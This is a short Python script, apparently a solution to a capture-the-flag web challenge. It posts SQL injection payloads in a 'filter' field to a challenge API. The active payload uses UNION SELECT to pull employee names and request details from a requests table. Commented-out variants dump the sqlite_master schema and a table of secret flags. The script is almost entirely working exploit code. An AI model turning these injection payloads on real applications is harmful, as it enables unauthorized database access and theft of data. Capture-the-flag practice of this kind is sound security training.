import requests

url = "http://kashictf.iitbhucybersec.in:53035/api/list-v2"

payload = {
    # "filter": "x' union select 1,1,1,1,1,group_concat(sql) from sqlite_master;#"
    # "filter": "x' union select request_id,secret_flag,1,1,1,1 from flags;#"
    "filter": "x' union select id,employee_name,request_detail,status,department,role from requests;#"
}

response = requests.post(url, json=payload)

data = response.text
print(data.replace("\\n", "\n"))
